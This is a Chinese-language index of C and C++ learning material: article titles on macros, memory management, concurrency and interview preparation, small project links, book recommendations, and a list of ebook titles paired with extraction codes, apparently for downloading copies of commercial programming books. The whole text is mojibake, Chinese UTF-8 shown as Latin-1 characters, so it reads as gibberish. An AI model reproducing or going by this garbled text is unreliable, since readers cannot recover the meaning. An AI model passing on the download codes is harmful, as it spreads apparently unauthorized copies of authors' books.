ç®€è¿°Cè¯­è¨€å®å®šä¹‰çš„ä½¿ç”¨ ä¸€äº›å€¼å¾—è¢«å®šä¹‰ä¸ºå¸¸ç”¨Cè¯­è¨€å¤´æ–‡ä»¶åº“çš„æ¼‚äº®å®å®šä¹‰(å€¼å¾—æ”¶è—,ä»¥å¤‡ä½¿ç”¨å‚è€ƒ) cè¯­è¨€ä¹‹å…±ç”¨ä½“unionã€æšä¸¾ã€å¤§å°ç«¯æ¨¡å¼ Cè¯­è¨€æ–‡ä»¶æ“ä½œ Cè¯­è¨€å¸¸ç”¨çš„ä¸€äº›è½¬æ¢å·¥å…·å‡½æ•°ï¼ å‡ ç§ç‰¹æ®Šçš„å‡½æ•°å®å°è£…æ–¹å¼ C&#x2F;C++ç¨‹åºå‘˜çš„ç¼–ç¨‹ä¿®å…» ç¼–å†™å¯ç§»æ¤ C&#x2F;C++ ç¨‹åºçš„ä¸€äº›è¦ç‚¹ Cè¯­è¨€å¹²è´§åˆ†äº«|æ›´é«˜å±‚æ¬¡ç¼–å†™åµŒå…¥å¼Cä»£ç  Cè¯­è¨€ç¼–ç¨‹è§„èŒƒ clean code Cè¯­è¨€ä»£ç ä¼˜åŒ–æ–¹æ¡ˆ(æ·±åº¦å¥½æ–‡) Cè¯­è¨€æ‰§è¡Œæ•ˆç‡å¦‚ä½•ä¿è¯ï¼Œçœ‹è¿™ä¸€æ–‡å°±å¤Ÿäº†ï¼ å…³äºå¯é‡å…¥å‡½æ•° å¬è¯´æœ‰äººä¸äº†è§£æŸ”æ€§æ•°ç»„ ä¸€æ–‡è¯»æ‡‚Cè¯­è¨€ä¸C++åŠ¨æ€å†…å­˜ OOP é¢å‘å¯¹è±¡ç¼–ç¨‹ï¼šç”± Cè¯­è¨€åˆ° C++ Cè¯­è¨€ä¸C++å¸¸è§é¢è¯•é¢˜ éš¾å¾—å•Šï¼ŒCè¯­è¨€&#x2F;C++åŸºç¡€é¢è¯•çŸ¥è¯†å¤§é›†åˆ é¢è¯•ä¸­å¸¸è§çš„Cè¯­è¨€ä¸C++åŒºåˆ«çš„é—®é¢˜ C&#x2F;C++ å…«è‚¡æ–‡ ç†¬å¤œæ•´ç†ï¼Œäº”ä¸‡å­—é•¿æ–‡æ€»ç»“ C&#x2F;C++ çŸ¥è¯†ç‚¹ é¢è¯•å¤§å…¨ | Cè¯­è¨€é«˜çº§éƒ¨åˆ†æ€»ç»“ ä¸¤ä¸‡å­—å¸¦ä½ ç‹™å‡»åµŒå…¥å¼ç¬”è¯•é¢è¯•é¢˜ é¢è¯•ï¼šC&#x2F;C++å¸¸è§åº“å‡½æ•°å®ç° å­¦ç”Ÿæˆç»©ç®¡ç†ç³»ç»Ÿæ¡ˆä¾‹ äºŒå‰æ ‘æ“ä½œè¯¦è§£ å­—ç¬¦ä¸²ä¹‹æ­£åˆ™è¡¨è¾¾å¼ ç†¬å¤œæ€»ç»“14ä¸ªç§’æ€ç®—æ³•é¢˜çš„å¥—è·¯ï¼ æ·±æ‹·è´ä¸æµ…æ‹·è´åˆ°åº•æ˜¯ä»€ä¹ˆ åå¤§ç»å…¸æ’åºç®—æ³•(åŠ¨æ€æ¼”ç¤º+ä»£ç ) C è¯­è¨€å®ç°ä¸€ä¸ªç®€å•çš„ web æœåŠ¡å™¨ 400 è¡Œ C ä»£ç å®ç°ä¸€ä¸ªè™šæ‹Ÿæœº C&#x2F;C++ å¥—æ¥å­—é€šä¿¡ç±»çš„å°è£… C&#x2F;C++ æœåŠ¡å™¨å¹¶å‘ æ‰‹å†™çº¿ç¨‹æ±  - Cè¯­è¨€ç‰ˆ Cè¯­è¨€çº¿ç¨‹åº“çš„ä½¿ç”¨ C&#x2F;C++åŠ¨æ€æ£€æµ‹å†…å­˜é”™è¯¯åˆ©å™¨ - ASan C&#x2F;C++ å…³äº cJson åº“çš„ä½¿ç”¨ è§†é¢‘æ¨èï¼š ã€Šéƒæ–ŒCè¯­è¨€è‡ªå­¦æ•™ç¨‹ã€‹ ã€Šç¨‹åºè®¾è®¡å…¥é—¨â€”â€”Cè¯­è¨€ï¼ˆæµ™å¤§ç¿æºï¼‰ã€‹ Cè¯­è¨€ç›¸å…³å°é¡¹ç›®åŠæºç  60ä¸ªå¥½ç©çš„Cè¯­è¨€ç¨‹åºï¼Œè®­ç»ƒç¼–ç¨‹æ€ç»´ï¼ŒåŸ¹å…»è§£å†³é—®é¢˜çš„æ€è·¯ï¼Œé¢†ç•¥å¤šå§¿å¤šå½©çš„Cè¯­è¨€ The Algorithms - C Cè¯­è¨€PATç»ƒä¹  Learn-Algorithms Cè¯­è¨€å•å…ƒæµ‹è¯•æ¡†æ¶ CJsonï¼šjsonè§£ç å™¨ï¼ŒCæ–‡ä»¶åªæœ‰500è¡Œ EasyLogger-ä¸€æ¬¾è½»é‡çº§é«˜æ€§èƒ½çš„æ—¥å¿—åº“ å°å‹Lispè§£é‡Šå™¨ï¼Œä¸è¶…è¿‡1000è¡Œä»£ç  PATå®éªŒè¾…åŠ©å¹³å° cwebsocketï¼šä¸€æ¬¾è½»é‡çº§websocketåº“ Cè¯­è¨€ï¼šæ–—åœ°ä¸»çš„å‘ç‰Œå™¨ C è¯­è¨€å®ç°é€šè®¯å½• C è¯­è¨€å®ç° 2048 æ¸¸æˆ Tinyhttpd,ä¸€ä¸ªä¸åˆ° 500 è¡Œçš„è¶…è½»é‡å‹ HTTP Serverï¼Œå¯ä»¥ç”¨æ¥ç†è§£æœåŠ¡å™¨ç¨‹åºçš„åŸç†å’Œæœ¬è´¨ db_tutorial,ç”¨ C ä»é›¶åˆ›å»ºä¸€ä¸ªç®€å•çš„æ•°æ®åº“ åˆ†äº«10ä¸ªé€‚åˆåˆå­¦è€…å­¦ä¹ çš„Cå¼€æºé¡¹ç›®ä»£ç  C++Cè¯­è¨€-&gt;C with class -&gt; C++;ç”±C++çš„æ¼”å˜å¯ä»¥çœ‹å‡ºæ¥ï¼ŒC++ åˆšå¼€å§‹å°±æ˜¯å¸¦ç±»çš„ C è¯­è¨€ï¼ŒC è¯­è¨€å’Œ C++ çš„å…³ç³»åˆ°åº•æ˜¯ä»€ä¹ˆå‘¢ï¼Ÿçœ‹è¿‡ä¾¯æ·è€å¸ˆçš„è§†é¢‘æˆ–è€…ã€ŠEffective C++ã€‹è¿™æœ¬ä¹¦å°±çŸ¥é“ï¼Œç°å¦‚ä»Šæˆ‘ä»¬æåˆ° C++ï¼Œéƒ½åº”è¯¥è§†å…¶ä¸ºä¸€ä¸ªåºå¤§çš„ã€Œè¯­è¨€è”é‚¦ã€ï¼Œæœ€èµ·ç åŒ…å«å¦‚ä¸‹å‡ ä¸ªé‡è¦çš„ç»„æˆéƒ¨åˆ†ï¼š é¢å‘è¿‡ç¨‹ç¼–ç¨‹ é¢å‘å¯¹è±¡ç¼–ç¨‹ æ³›å‹ç¼–ç¨‹ å…ƒç¼–ç¨‹ å‡½æ•°å¼ç¼–ç¨‹ STLæ ‡å‡†åº“ å…¶ä¸­ã€Œé¢å‘è¿‡ç¨‹ç¼–ç¨‹ã€ï¼Œæ­£æ˜¯ C++ æä¾›çš„å‘åå…¼å®¹ Cè¯­è¨€çš„éƒ¨åˆ†ã€‚ C++æ¼”åŒ–ï¼ˆC++ 98 -&gt;C++ 03 -&gt; C++ 11 -&gt; C++ 14 -&gt; C++20 -&gt; â€¦.. ï¼‰ C++ ç›¸å…³ä¹¦ç±ä¹¦ç±æ¨èï¼š ã€ŠC++ Primerä¸­æ–‡ç‰ˆã€‹æœ¬ä¹¦é¢å‘ C++ è¯­è¨€çš„åˆå­¦è€…ï¼Œæ˜¯ä¸€æœ¬å¾ˆå‹å¥½çš„è‡ªå­¦æ•™æã€‚ä½œè€…æŠŠ C è¯­è¨€çš„åŸºç¡€æ¦‚å¿µå’Œéœ€è¦æ³¨æ„çš„ç¼–ç¨‹ç»†èŠ‚è¯´å¾—å¾ˆæ¸…æ¥šï¼Œå¹¶ä¸”ä¾‹ç¨‹å’Œä¹ é¢˜ä¸°å¯Œï¼Œç›¸ä¿¡è®¤çœŸè¯»è¿‡ä¹‹åï¼Œå¯ä»¥å®Œæˆ C è¯­è¨€å…¥é—¨è¿™ä¸ªç›®æ ‡ã€‚ ã€Šé«˜è´¨é‡ç¨‹åºè®¾è®¡æŒ‡å—ã€‹ï¼Œå¢™è£‚æ¨èï¼Œè¿™æœ¬ä¹¦çœ‹å¾—æ¯”è¾ƒè¿‡ç˜¾ï¼Œä¹¦é‡Œé¢æœ‰ä¸€äº›ç¼–ç¨‹è§„èŒƒçš„ä¸œè¥¿ï¼Œå¯¹äºå†™ç¨‹åºçš„äººæ¥è¯´ï¼Œè¿˜æ˜¯ä¸é”™çš„ï¼Œå¯ä»¥åŸ¹å…»å¥½çš„ç¼–ç ä¹ æƒ¯ï¼ŒåŠ æ·±äº†ä¸€äº›çŸ¥è¯†çš„å·©å›ºã€‚æ¯”è¾ƒå®ç”¨ï¼Œä¹Ÿé€‚åˆé¢è¯•å‰çœ‹çœ‹ã€‚ ã€ŠEssential C++ä¸­æ–‡ç‰ˆã€‹æ˜¯ä¸€æœ¬å†…å®¹ä¸å¤šä½†å¾ˆå®ç”¨çš„ C++ å…¥é—¨ä¹¦ç±ï¼Œå¼ºè°ƒå¿«é€Ÿä¸Šæ‰‹ä¸ç†è§£ C++ ç¼–ç¨‹ã€‚æœ¬ä¹¦ä¸»è¦å›´ç»•ä¸€ç³»åˆ—é€æ¸å¤æ‚çš„ç¨‹åºé—®é¢˜ï¼Œä»¥åŠç”¨ä»¥è§£å†³è¿™äº›é—®é¢˜çš„è¯­è¨€ç‰¹æ€§å±•å¼€è®²è§£ã€‚ä½ ä¸åªå­¦åˆ° C++ çš„å‡½æ•°å’Œç»“æ„ï¼Œä¹Ÿä¼šå­¦ä¹ åˆ°å®ƒä»¬çš„è®¾è®¡ç›®çš„å’ŒåŸºæœ¬åŸç†ã€‚ ã€ŠMore Effective C++ï¼ˆä¸­æ–‡ç‰ˆï¼‰ã€‹ï¼Œè¯¥ä¹¦å›´ç»•55æ¡å‡†åˆ™ï¼Œæ¯ä¸€æ¡éƒ½ä»‹ç»äº†ä¸€ä¸ªå¯è®©ä½ å†™å‡ºæ›´å¥½çš„C++ç¨‹åºä»£ç çš„æ–¹æ³•ï¼Œå¹¶ä»¥ç‰¹åˆ«è®¾è®¡è¿‡çš„ä¾‹å­è¯¦åŠ è®¨è®ºã€‚ ã€Šæé«˜C++æ€§èƒ½çš„ç¼–ç¨‹æŠ€æœ¯ã€‹ï¼Œæœ¬ä¹¦è®¤ä¸º 20% çš„æ€§èƒ½ç¼ºé™·å°†ä¼šå ç”¨æˆ‘ä»¬ 80% çš„æ—¶é—´ã€‚å› æ­¤æˆ‘ä»¬æŠŠç²¾åŠ›é›†ä¸­åœ¨æœ€æœ‰ä»·å€¼çš„åœ°æ–¹ã€‚æœ¬ä¹¦è¯¦ç»†è®¨è®ºäº†ä¸´æ—¶å¯¹è±¡ã€å†…å­˜ç®¡ç†ã€ç»§æ‰¿ã€è™šå‡½æ•°ã€å†…è”ã€å¼•ç”¨è®¡æ•°ä»¥åŠ STL ç­‰ä¸€åˆ‡æœ‰å¯èƒ½æå‡ C++ æ•ˆç‡çš„ç»†èŠ‚å†…å®¹ã€‚æ— è®ºä½ æ˜¯ç›¸å…³é¢†åŸŸçš„ä»ä¸šäººå‘˜ï¼Œè¿˜æ˜¯ C++ ç¨‹åºè®¾è®¡çˆ±å¥½è€…ï¼Œæˆ–è€…æ˜¯æ¸´æœ›çªç ´ç¼–ç¨‹ç“¶é¢ˆã€å¤§å¹…æå‡è‡ªæˆ‘ä¿®ä¸ºçš„ç¨‹åºè®¾è®¡çˆ±å¥½è€…ï¼Œæœ¬ä¹¦éƒ½å¿…å°†ä½¿ä½ è·ç›Šè‰¯å¤šã€‚ ã€Šä»ç¼ºé™·ä¸­å­¦ä¹ C&#x2F;C++ã€‹ä»æœ¬è´¨ä¸Šæ¥è¯´ï¼Œè¿™å°±æ˜¯ä¸€ä¸ª C&#x2F;C++ çš„é”™é¢˜é›†ã€‚å…¨ä¹¦ä¸­åŒ…æ‹¬ 63 ä¸ªé—®é¢˜å¼•å‘çš„é”™è¯¯ï¼Œå³ä¹¦åä¸­çš„ç¼ºé™·ã€‚ä¹Ÿæ˜¯é¿å‘æŒ‡å—ã€‚ ã€ŠC++ Templatesä¸­æ–‡ç‰ˆã€‹ï¼Œæ·±å…¥äº†è§£ç°ä»£ c++ æ¨¡æ¿çš„å®ç”¨ä¹¦ç±ã€‚æœ¬ä¹¦ä¸ä»…æ˜¯å¯¹ C++ æ¨¡æ¿çš„æƒå¨è§£é‡Šï¼Œè€Œä¸”æœ¬ä¹¦è¿˜æ·±å…¥åœ°ä»‹ç»äº†å…¶ä»–ä¸€èˆ¬çš„ C++ æ€æƒ³ã€‚ ã€ŠSTLæºç å‰–æã€‹è¯¦ç»†åœ°äº†è§£ STL çš„åº•å±‚å®ç°æœºåˆ¶ï¼ŒåŒæ—¶ä¹Ÿå¯ä»¥å¯¹å¸¸ç”¨æ•°æ®ç»“æ„ï¼ŒC++ å†…å­˜ç®¡ç†æ‹¥æœ‰æ›´æ·±çš„ç†è§£ã€‚ è¿˜æœ‰ã€ŠC++æ ‡å‡†åº“(ç¬¬2ç‰ˆ)ã€‹ã€ã€ŠC++å¹¶å‘ç¼–ç¨‹å®æˆ˜ã€‹ã€ã€ŠC++ç¼–ç¨‹æ€æƒ³ï¼ˆä¸¤å·åˆè®¢æœ¬ï¼‰ã€‹ç­‰ï¼Œä»‹ç»çš„è¿™äº›ä¹¦æˆ‘éƒ½ä¹°äº†ï¼Œä¸è¿‡è¯´å®è¯ï¼Œåé¢çš„å‡ æœ¬éƒ½æ˜¯æ³›æ³›çš„çœ‹äº†ä¸‹ï¼Œå½“ä½œå·¥å…·ä¹¦ã€‚ å…¶ä»–æ–‡æ¡£: åä¸ºæœ€ç‰›é€¼çš„c++ åŸºç¡€ä¸æé«˜PDF LeetCode101é¢˜è§£ Google å¼€æºé¡¹ç›®é£æ ¼æŒ‡å—â€”â€”ä¸­æ–‡ç‰ˆ C++ ç›¸å…³ç”µå­ä¹¦å’Œèµ„æ–™: éœ€è¦ä¸‹è½½ä¸‹é¢ç”µå­ä¹¦çš„è¯ï¼Œç›´æ¥ç‚¹å‡»ä¹¦åï¼Œè¾“å…¥æå–ç ï¼ ç¬¬äºŒå¥—ã€ä¾¯æ·è€å¸ˆå…¨ç³»åˆ—å…«éƒ¨æ›² - æ‰‹æŠŠæ‰‹æ•™ä½ è¿›é˜¶ç³»åˆ— æå–ç ï¼šrb16 00 - ä¾¯æ·ç³»åˆ—-å…¨éƒ¨è¯¾ä»¶ æå–ç ï¼špoo3 01ã€C++é¢å‘å¯¹è±¡é«˜çº§ç¼–ç¨‹ï¼ˆä¸Šï¼‰ æå–ç ï¼š51rd 01ã€C++é¢å‘å¯¹è±¡é«˜çº§ç¼–ç¨‹ï¼ˆä¸‹ï¼‰ æå–ç ï¼š0869 00 - ä¾¯æ·ç³»åˆ—-å…¨éƒ¨è¯¾ä»¶ æå–ç ï¼špoo3 03 - ä¾¯æ·-C++è®¾è®¡æ¨¡å¼ æå–ç ï¼šzn8n 04 - ä¾¯æ·-C++æ–°æ ‡å‡†C++11&amp;14 æå–ç ï¼š5jl1 05 - ä¾¯æ·-C++å†…å­˜ç®¡ç†æœºåˆ¶_60_ä¾¯æ· æå–ç ï¼šb8b3 06 - ä¾¯æ·-C++ Startup æ­å¯†ï¼šC++ ç¨‹åºçš„ç”Ÿå‰å’Œæ­»å æå–ç ï¼šadro 07ã€ç®—æ³•åŸç†ä¸å®è·µï¼ˆé€‰ä¿®ï¼‰ æå–ç ï¼š7548 08ã€ç³»ç»Ÿè®¾è®¡ä¸å®è·µï¼ˆé€‰ä¿®ï¼‰ æå–ç ï¼š697b ç¬¬ä¸‰å¥—ã€Linux CC++ç½‘ç»œç¼–ç¨‹å®è·µ-é™ˆç¡• æå–ç ï¼šwv79 é™ˆç¡• - C++å®è·µå·¥ç¨‹å­¦ æå–ç ï¼šblou æ˜“å­¦C++ æå–ç ï¼šyiwo æé«˜C++æ€§èƒ½çš„ç¼–ç¨‹æŠ€æœ¯.å·¦é£ æå–ç ï¼šanft æ·±å…¥ç†è§£C++11 æå–ç ï¼špy26 æ·±åº¦æ¢ç´¢C++å¯¹è±¡æ¨¡å‹ æå–ç ï¼š0v2p ä¾¯æ·STLè¯¾ä»¶ æå–ç ï¼šfuuh è·Ÿæˆ‘ä¸€èµ·å†™makefile æå–ç ï¼šk090 å¤§è¯è®¾è®¡æ¨¡å¼C++ æå–ç ï¼šr1wi é™ˆç¡• - C++å®è·µå·¥ç¨‹å­¦ æå–ç ï¼šdgy4 STLæºç å‰–æ+æºç  æå–ç ï¼šnkcl Modern C++ Design æå–ç ï¼št1kk Effective-C++-ç¬¬äºŒç‰ˆ æå–ç ï¼švy1b Effective STLä¸­æ–‡ç‰ˆ æå–ç ï¼št3gy Effective C++ ç¬¬ä¸‰ç‰ˆ é«˜æ¸…PDF æå–ç ï¼šbd36 C++è®¾è®¡æ–°æ€ç»´-æ³›å‹ç¼–ç¨‹ä¸è®¾è®¡ä¹‹åº”ç”¨ æå–ç ï¼š7gew C++å·¥ç¨‹å®è·µç»éªŒè¯¾ æå–ç ï¼šo5v4 C++å¯¹è±¡æ¨¡å‹ æå–ç ï¼šazv9 C++å¤§å­¦æ•™ç¨‹ æå–ç ï¼š012g C++ç¨‹åºè®¾è®¡è¯­è¨€ æå–ç ï¼šabu1 C++æ²‰æ€å½•ä¸­æ–‡ç¬¬2ç‰ˆ æå–ç ï¼šo88v C++å¹¶å‘ç¼–ç¨‹å®æˆ˜ æå–ç ï¼šfuj8 C++æ ‡å‡†ç¨‹åºåº“ æå–ç ï¼š318m C++ç¼–ç¨‹è°ƒè¯•ç§˜ç¬ˆ æå–ç ï¼š8ool C++ç¼–ç¨‹æ€æƒ³ï¼ˆä¸¤å·åˆè®¢æœ¬ï¼‰ æå–ç ï¼šekkz C++ç¼–ç¨‹è§„èŒƒ-101æ¡è§„åˆ™å‡†åˆ™ä¸æœ€ä½³å®è·µ æå–ç ï¼š0o6k C++Primer 5th è‹±æ–‡ç‰ˆ æå–ç ï¼šcxmu C++ Primerä¹ é¢˜é›† æå–ç ï¼šlvmx C++ Primer-ç¬¬4ç‰ˆ æå–ç ï¼š8gyu C++ Primerï¼ˆç¬¬5ç‰ˆï¼‰_å¸¦ä¹¦ç­¾_é«˜æ¸…å®Œæ•´ç‰ˆ æå–ç ï¼šx6rl C++ Primer Plus æå–ç ï¼ši0p7 C++ å¹²è´§æ–‡ç«  ä¸€æ–‡è®©ä½ å­¦å®ŒC++ï¼Œå¹²è´§æ”¶è—ï¼ï¼ï¼ 2022æœ€ç¨³C&#x2F;C++å­¦ä¹ è·¯çº¿ å‘ï¼Œè¿™ä¸å°±æ˜¯ä½ è¦çš„C++åå°å¼€å‘å­¦ä¹ è·¯çº¿å—ï¼Ÿ è¿™æ‰æ˜¯ä½ éœ€è¦çš„Cè¯­è¨€ã€C++å­¦ä¹ è·¯çº¿ï¼ æ ¡æ‹›ï½œ C++ åå°å¼€å‘å­¦ä¹ è·¯çº¿ STLæ€»ç»“ä¸å¸¸è§é¢è¯•é¢˜+èµ„æ–™ ä¸€å®šç”¨å¾—åˆ°çš„å…è´¹C++èµ„æºé›†åˆï¼Œå€¼å¾—æ”¶è— ä¸¤ä¸‡å­—æ€»ç»“ã€ŠC++ Primerã€‹è¦ç‚¹ æ·±åº¦æ¢ç´¢C++å¯¹è±¡æ¨¡å‹ç¬”è®° Effective C++å­¦ä¹ ç¬”è®° C&#x2F;C++æ¡†æ¶å’Œç¬¬ä¸‰æ–¹åº“æ±‡æ€» ä¸‡å­—é•¿æ–‡ç³»ç»Ÿæ¢³ç†C++å‡½æ•°æŒ‡é’ˆ å­¦è¿‡ C++ çš„ä½ ï¼Œä¸å¾—ä¸çŸ¥çš„è¿™ 10 æ¡ç»†èŠ‚ï¼ å€¼å¾—æ”¶è—çš„å‡ ä¸ª C&#x2F;C++ å­¦ä¹ ç½‘ç«™ å‡å¦‚C++æ˜¯ä¸€åªç®­ï¼Œä½ ä¼šç”¨å®ƒæ¥å°„å“ªåªé›•ï¼Ÿ| å°±ä¸šå²—ä½åˆ†äº« å¦‚ä½•ä¼˜é›…åœ°åˆ©ç”¨C++ç¼–ç¨‹ä»1ä¹˜åˆ°20ï¼Ÿ C&#x2F;C++ ä¸­çš„ #pragma once ä½œç”¨æ˜¯ä»€ä¹ˆï¼Ÿ C++ Best Practices (C++æœ€ä½³å®è·µ)ç¿»è¯‘ä¸é˜…è¯»ç¬”è®° é˜²å¾¡æ€§ç¼–ç¨‹æŠ€å·§ äº”ä¸‡å­—è¯»æ‡‚c++ çœ‹å®Œè¿™ 7 æ¡ï¼Œæ¨¡æ‹Ÿ C++ æ–°åŠŸèƒ½åªæ˜¯ä¸€ä¸ªå°ç›®æ ‡ï¼ ç¡¬æ ¸ | C++ åŸºç¡€å¤§å…¨ C++æ¨¡æ¿æ€»ç»“ C++ è¯»å– UTF-8 åŠ GBK ç³»åˆ—çš„æ–‡æœ¬æ–¹æ³•åŠåŸç† C++ æ—¥æœŸå’Œæ—¶é—´ç¼–ç¨‹ C++ ç¼–ç¨‹ä¹ æƒ¯ä¸ç¼–ç¨‹è¦ç‚¹ C++ å†…å­˜æ¨¡å‹ ç¼–ç¨‹5åˆ†é’Ÿï¼Œå‘½å2å°æ—¶ï¼èŠèŠå‘½åè§„åˆ™ï¼ C++ ä¸æ­£åˆ™è¡¨è¾¾å¼ æ‰‹å†™çº¿ç¨‹æ±  - C++ç‰ˆ C++ çº¿ç¨‹çš„ä½¿ç”¨ C++ å…«è‚¡æ–‡ï¼ˆä¸€ï¼‰ C++ ä½¿ç”¨ chrono åº“å¤„ç†æ—¥æœŸå’Œæ—¶é—´ ç¡¬æ ¸ | 50 å®¶ä¼ä¸š C++ é¢ç»åˆ†äº« C++ç¼–è¯‘æœŸå¤šæ€ä¸è¿è¡ŒæœŸå¤šæ€ C++ å¹¶å‘ç¼–ç¨‹ï¼ˆC++11 åˆ° C++17 ï¼‰ C++å†…å­˜ç®¡ç†ï¼ˆå»ºè®®æ”¶è—ï¼‰ ä¸¤ä¸‡å­—é•¿æ–‡ï¼Œè§è¿‡æœ€å¥½çš„æ¨¡æ¿å…ƒç¼–ç¨‹æ–‡ç« ï¼ C++è™šå‡½æ•°è¡¨åŸç†æµ…æ C++å‡½æ•°è°ƒç”¨è¿‡ç¨‹æ·±å…¥åˆ†æ åŠ¨å›¾æ¼”ç¤ºï¼šå¦‚ä½•å½»åº•ç†è§£çº¢é»‘æ ‘ï¼Ÿ C++æ€§èƒ½ä¼˜åŒ– ä¸‡å­—é•¿æ–‡|æ·±å…¥ C++ å†…å­˜ç®¡ç† ä¸€ä¸ªç¨‹åºå‘˜çš„C++å­¦ä¹ ä¹‹è·¯ C++å¼‚å¸¸æœºåˆ¶æ¦‚è¿° è¿™äº›è¯¾å ‚ä¸Šä¸æ•™çš„ C++ çš„åŸºæœ¬ç‰¹æ€§ä½ éƒ½çŸ¥é“å—ï¼Ÿ C++ å¦‚ä½•é¿å…å†…å­˜æ³„éœ²ï¼Ÿ C++11 ä¸­çš„å·¦å€¼ã€å³å€¼å’Œå°†äº¡å€¼ C&#x2F;C++å‡½æ•°æŒ‡é’ˆä¸æŒ‡é’ˆå‡½æ•° delete å’Œ delete [] çš„çœŸæ­£åŒºåˆ« C++ å­¦ä¹ ç¬”è®° ä¸€èµ·æ¢ç´¢C++ç±»å†…å­˜åˆ†å¸ƒ ã€æœ€ä½³å®è·µã€‘C++é™·é˜±ä¸å¥—è·¯ æ³›å‹Lambdaï¼Œå¦‚æ­¤å¼ºå¤§ï¼ æ¶æ„æ€ç»´ï¼šå¦‚ä½•è®©å†™ç¨‹åºåƒæ­ç§¯æœ¨ä¸€æ ·è½»æ¾ï¼Ÿ æ‰“å·¥äººä¸‡å­—è®²æ¸…è½¯ä»¶æ€§èƒ½ä¼˜åŒ– C++æŒ‰å€¼è¿”å›å¯¹è±¡é‚£äº›äº‹ å“ªä¸ªç¨‹åºç»å¾—èµ·è¿™æ ·çš„ä¼˜åŒ–ï¼Ÿ C++ çš„é—¨é—¨é“é“ çº¿ç¨‹å®‰å…¨ä»£ç åˆ°åº•æ˜¯æ€ä¹ˆç¼–å†™çš„ï¼Ÿ å†…å­˜ç®¡ç†ï¼šç¨‹åºæ˜¯å¦‚ä½•è¢«ä¼˜é›…çš„è£…è½½åˆ°å†…å­˜ä¸­ ç®€å•ï¼ä»£ç åŸæ¥æ˜¯è¿™æ ·è¢«CPUè·‘èµ·æ¥çš„ 600 æ¡æœ€å¼º Linux å‘½ä»¤æ€»ç»“ C++å¯¹è±¡çš„åº•å±‚åŸç†éƒ½åœ¨è¿™å„¿äº†ï¼Œè¿˜æ•¢è¯´å­¦ä¸ä¼šï¼Ÿ C++æ˜¯å¦‚ä½•ä»ä»£ç åˆ°æ¸¸æˆçš„ï¼Ÿ if-elseå’Œswitch-caseå“ªä¸ªæ•ˆç‡æ›´é«˜ï¼Ÿçœ‹è¿™å››å¼ å›¾ã€‚ è°ˆè°ˆ C++ å•ä¾‹æ¨¡å¼ äº²èº«ä½“éªŒï¼åç«¯å·¥ç¨‹å¸ˆå­¦ä¹ è·¯å¾„ã€ä¹¦ç±ã€è§†é¢‘æ¨è C++å¸¸è§çš„ä¸‰ç§å†…å­˜ç ´åçš„åœºæ™¯å’Œåˆ†æ ä½ è¸©è¿‡å‡ ç§C++å†…å­˜æ³„éœ²çš„å‘ï¼Ÿ å†…å­˜æ± è®¾è®¡ä¸å®ç° æ‰“å¼€çº¿ç¨‹ | è¿›ç¨‹ | åç¨‹çš„å¤§é—¨ æ·±åº¦å¥½æ–‡|é¢è¯•å®˜ï¼šè¿›ç¨‹å’Œçº¿ç¨‹ï¼Œæˆ‘åªé—®è¿™19ä¸ªé—®é¢˜ æ•ˆèƒ½ä¼˜åŒ–å®è·µ | C&#x2F;C++å•å…ƒæµ‹è¯•ä¸‡èƒ½æ’æ¡©å·¥å…· æ‰‹å†™çº¿ç¨‹æ±  - C++ç‰ˆ C++ çº¿ç¨‹çš„ä½¿ç”¨ C++å­¦åˆ°ä»€ä¹ˆç¨‹åº¦å¯ä»¥é¢è¯•å·¥ä½œï¼Ÿ C++ å†…å­˜ç®¡ç†ï¼ˆä¸€ï¼‰ std æºç å‰–æåŠ C++ å†…å­˜ç®¡ç†(äºŒ) C++ä»£ç ç®€åŒ–ä¹‹é“ æ­å¼€é«˜æ€§èƒ½æœåŠ¡å™¨åº•å±‚é¢çº± windowsç¨‹åºå´©æºƒè°ƒè¯•ç»ˆææ­¦å™¨ é•¿æ–‡é¢„è­¦ï¼Cè¯­è¨€ä¸C++å¸¸è§é—®ç­”é¢˜ æå‡ C++ å¼€å‘æ•ˆç‡çš„å‡ ä¸ªå°æŠ€å·§ ä¹¦å•ï¼šæ‹“å±•å¯¹C++çš„è®¤çŸ¥å±‚æ¬¡ å’Œå„ç§è¯¡å¼‚ Bug æ‰“äº¤é“ 13 å¹´ï¼Œæˆ‘æ€»ç»“äº† 18 ä¸ªç»éªŒ å»é“¶è¡Œå†™ä»£ç æ˜¯ä»€ä¹ˆæ ·çš„ä½“éªŒ è°ˆè°ˆC++æ–°æ ‡å‡†å¸¦æ¥çš„å±æ€§ï¼ˆAttributeï¼‰ ç™¾åº¦C++å·¥ç¨‹å¸ˆçš„é‚£äº›æé™ä¼˜åŒ–ï¼ˆå¹¶å‘ç¯‡ï¼‰ ç™¾åº¦C++å·¥ç¨‹å¸ˆçš„é‚£äº›æé™ä¼˜åŒ–ï¼ˆå†…å­˜ç¯‡ï¼‰ å›¾è§£|ä»æ­¦ä¾ è§’åº¦æ¢ç©¶STLæ’åºç®—æ³•çš„å¥¥ç§˜ C++ä¸­æ˜¯å¦‚ä½•è°ƒç”¨Cæ¥å£çš„ï¼Ÿ C++ç¼–ç ä¼˜åŒ–ä¹‹å‡å°‘å†—ä½™æ‹·è´æˆ–èµ‹å€¼ è®¡ç®—æœºä¸ºä»€ä¹ˆè¦ç”¨è¡¥ç ï¼Ÿ ç”Ÿæˆéšæœºæ•°çš„æ–¹å¼ä½ é€‰å¯¹äº†å—ï¼Ÿ æ€»ç»“äº†24ä¸ªC++çš„å¤§å‘ï¼Œçœ‹ä½ èƒ½èº²è¿‡å‡ ä¸ªï¼Ÿ è¿™äº›çŸ¥è¯†ç‚¹ä½ éƒ½çŸ¥é“å—ï¼Œæµ‹è¯•ä½ çš„C++å…¥é—¨ç¨‹åº¦ è¶…ç¡¬æ ¸ | 2 ä¸‡å­—+20 å›¾å¸¦ä½ æ‰‹æ’• STL åºåˆ—å¼å®¹å™¨æºç  æµ…æC++æ™ºèƒ½æŒ‡é’ˆå’Œenable_shared_from_this æœºåˆ¶ ç»å…¸æ°¸ä¸è¿‡æ—¶ï¼é‡æ¸©è®¾è®¡æ¨¡å¼ å…¨ç½‘é¦–å‘ï¼ï¼C++20æ–°ç‰¹æ€§å…¨åœ¨è¿™ä¸€å¼ å›¾é‡Œäº† C++çš„æœ€åä¸€é“å|ç™¾ä¸‡å¹´è–ªçš„ç¨‹åºå‘˜ C++æ¨¡ç‰ˆçš„æœ¬è´¨ 10 ä¸ªå†…å­˜å¼•å‘çš„å¤§å‘ï¼Œä½ èƒ½èº²å¼€å‡ ä¸ªï¼Ÿ C++å†…å­˜ç®¡ç†å…¨æ™¯æŒ‡å— 9ä¸ªæé«˜ä»£ç è¿è¡Œæ•ˆç‡çš„å°æŠ€å·§ä½ 